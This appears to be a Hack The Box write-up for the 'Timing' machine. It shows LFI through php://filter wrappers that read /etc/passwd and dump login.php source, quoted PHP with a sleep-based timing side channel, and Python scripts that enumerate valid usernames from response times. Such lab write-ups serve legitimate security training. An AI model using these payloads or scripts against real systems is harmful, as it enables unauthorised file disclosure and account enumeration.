## Timing Machine - htb

Index:
- LFI
- Wrappers
- Timing Enumeration

```
gobuster dir -u http://$ipv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**LFI + PHP Wrappers**
```
curl -XGET http://$ipv/image.php?img=php://filter/resource=/etc/passwd

curl -XGET http://$ipv/image.php?img=php://filter/convert.base64-encode/resource=header.php
```

Let's inspect login.php using the same method:
```
curl -XGET http://$ipv/image.php?img=php://filter/convert.base64-encode/resource=./login.php | base64 -d > login.php
```
The points that we have to look up is the function createTimeChannel:
```
function createTimeChannel()
{
    sleep(1);
}
.
.
.
.
    if ($user !== false) {
        createTimeChannel();#!!!!
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
            header('Location: ./index.php');
            return;
        }
    }
```
Whe the user is correct the app sleeps for 1 second. With this we can brute force user enumeration. You can check that with burp suite, with the user admin.

Let's create a python script to enumerate users;
POC
```python
import requests

r = requests.post("http://10.10.11.135/login.php?login=true", data={"user": "admin", "password":"p4$$w0rd!"})
print(r.elapsed)

r = requests.post("http://10.10.11.135/login.php?login=true", data={"user": "daffi", "password":"p4$$w0rd!"})
print(r.elapsed)
import pdb; pdb.set_trace()
```
Execute this with:
```
python3 -i enum_users.py
0:00:01.274611
0:00:00.201168

(Pdb) print(r)
(Pdb) print(r.text)
(Pdb) dir(r) # to get attributes of the object
(Pdb) print(r.status_code)
(Pdb) print(r.elapsed) #delay between request and answer
```
This is the main concepts to exploit this enumeration technique.
```python
import requests
import sys

data = {"user":sys.argv[1],"password":"password"}
r = requests.post("http://10.10.11.135/login.php?login=true", data=data)
print(r.elapsed.microseconds)

if (r.elapsed.microseconds > 220000):
    print(f"User valid:", data["user"])
else:
    print(f"User Invalid:", data["user"])
#import pdb; pdb.set_trace()

```
